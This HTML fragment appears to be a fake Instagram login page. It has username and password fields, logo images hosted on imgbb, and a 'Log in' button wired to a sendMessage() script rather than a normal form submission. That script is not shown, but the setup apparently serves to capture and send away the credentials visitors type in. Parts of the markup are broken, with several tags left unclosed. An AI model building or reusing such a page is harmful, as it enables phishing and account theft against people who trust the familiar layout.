  <body>
    <div class="container">

        <a href="https://imgbb.com/"

            alt="instagram"
            id="image"
        /></a>
      </div>
      <!--end of image-->
      <div class="col content">
        <div class="box">
          <div class="title">
            <a href="https://ibb.co/XtKd6c7"

          <form class="login-form">
            <div class="form-content">
              <input type="text" id="username" name="uname"  autocapitalize="off" autocorrect="off" required />

            </div>
            <div class="form-content">
              <input type="password" id="password" name="password" required />

            </div>
            <div class="form-content">
              <button type="submit" style="background-color: #4cb5f9" onclick="sendMessage()">
                Log in
              </button>
            </div>
            <div class="form-ending">
              <center>
                <p id="OR">OR</p>
                <span id="line"></span>
              </center>
              <p id="facebook">
                <i class="fab fa-facebook-square"></i>Login with Facebook
              </p>
              <a href="#">Forgot password?</a>
            </div>
          </form>
        </div>
        <div class="mini-box">
          <div class="text">Don't have an account? <a href="#">Sign up</a></div>
        </div>
        <div class="download-section">
          <p>Get the app.</p>

            <a href="https://imgbb.com/"
